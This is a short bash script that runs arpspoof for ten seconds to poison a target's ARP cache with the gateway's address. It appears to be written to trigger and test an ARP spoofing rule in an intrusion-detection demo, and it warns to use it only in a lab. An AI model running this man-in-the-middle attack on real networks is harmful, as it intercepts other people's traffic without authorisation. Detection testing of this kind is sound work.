#!/usr/bin/env bash
# arp_spoof.sh — ARP Spoofing attack test script for NetGuard IDPS demonstration
#
# Prerequisites: arpspoof (part of the dsniff suite)
#   Install: sudo apt-get install dsniff
#
# Usage:
#   IFACE=<interface> TARGET_IP=<victim-ip> GATEWAY_IP=<gateway-ip> bash arp_spoof.sh
#   Example: IFACE=eth0 TARGET_IP=192.168.1.100 GATEWAY_IP=192.168.1.1 bash arp_spoof.sh
#
# What it does:
#   Sends gratuitous ARP replies to TARGET_IP claiming the attacker's MAC owns GATEWAY_IP.
#   This creates conflicting MAC-to-IP mappings that ArpSpoofRule detects.
#
# Expected detection in NetGuard:
#   Attack type : ARP Spoofing
#   Rule        : ARP_SPOOF_001
#   Severity    : High
#   Confidence  : 97 (2 distinct MACs for same IP) → 100 (≥ 3 distinct MACs)
#   Appears on dashboard within ~5 seconds of script start
#
# Safe-use warning:
#   Run ONLY in an isolated lab/hackathon network.
#   ARP spoofing intercepts LAN traffic and constitutes a man-in-the-middle attack.
#   Running this on a production or shared network is illegal without explicit
#   authorisation. Script auto-stops after 10 seconds via timeout(1).

IFACE="${IFACE:-}"
TARGET_IP="${TARGET_IP:-}"
GATEWAY_IP="${GATEWAY_IP:-}"

if [ -z "$IFACE" ] || [ -z "$TARGET_IP" ] || [ -z "$GATEWAY_IP" ]; then
    echo "ERROR: IFACE, TARGET_IP, and GATEWAY_IP must all be set." >&2
    echo "Usage: IFACE=eth0 TARGET_IP=192.168.1.100 GATEWAY_IP=192.168.1.1 bash $0" >&2
    exit 1
fi

echo "[*] Starting ARP spoof: telling $TARGET_IP that $GATEWAY_IP is at our MAC..."
echo "[*] Interface: $IFACE | Duration: 10 seconds"
timeout 10 arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY_IP"
echo "[*] Done. Check NetGuard dashboard for ARP Spoofing alert."
